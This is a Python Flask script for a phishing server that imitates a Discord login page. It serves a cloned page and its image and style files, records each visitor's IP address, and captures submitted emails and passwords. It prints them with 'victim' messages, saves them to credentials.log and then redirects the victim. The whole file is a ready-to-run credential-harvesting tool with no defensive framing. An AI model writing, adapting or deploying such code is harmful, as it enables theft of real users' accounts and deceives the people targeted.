from flask import Flask, request, render_template, send_file, redirect
from threading import Thread
from colorama import Fore
from sys import argv
import sys
import colorama
import logging
import os

#### Variables
redirect_url = argv[1]
host = argv[2]
port = int(argv[3])
sitename = argv[4]
display_reqs = argv[5]

#### Config
app = Flask(__name__)
logging.getLogger('werkzeug').disabled = True if display_reqs != "y" else None
sys.modules['flask.cli'].show_server_banner = lambda *x: None
colorama.init(autoreset=True)


print("\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to to to the link...")
#### App.route
@app.route("/")
def index():
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " IP address found: " + Fore.CYAN + request.headers.get('X-Forwarded-For'))
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
    print("\n\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.YELLOW + " Waiting for victim to enter credentials...")
    return render_template("Discord.html")

@app.route("/login", methods=["POST"])
def getcreds():
    with open("credentials.log" , "a") as file:
        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Victim entered credentials!")
        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Email: " + Fore.CYAN + request.form.get('email'), "\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Password: " + Fore.CYAN + request.form.get('password'))
        file.write(f"{request.form.get('email')} : {request.form.get('password')} : {request.headers.get('X-Forwarded-For')} : {sitename}\n")
        print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Saved in: " + Fore.CYAN + "credentials.log")
        return redirect(redirect_url)


@app.route('/Discord_files/0.70a90daa9b002d99a7e7.css')
def CSS():
    return send_file(os.path.join("templates", "Discord_files", "0.70a90daa9b002d99a7e7.css"))

@app.route("/Discord_files/36d4b341723daffd4a372e1b19591da1.png ")
def Logo1():
    return send_file(os.path.join("templates", "Discord_files", "36d4b341723daffd4a372e1b19591da1.png"))

@app.route("/Discord_files/14c037b7102f18b2d2ccf065a52bb595.jpg")
def Logo2():
    return send_file(os.path.join("templates", "Discord_files", "14c037b7102f18b2d2ccf065a52bb595.jpg"))


#### Execution
app.run(host=host, port=port)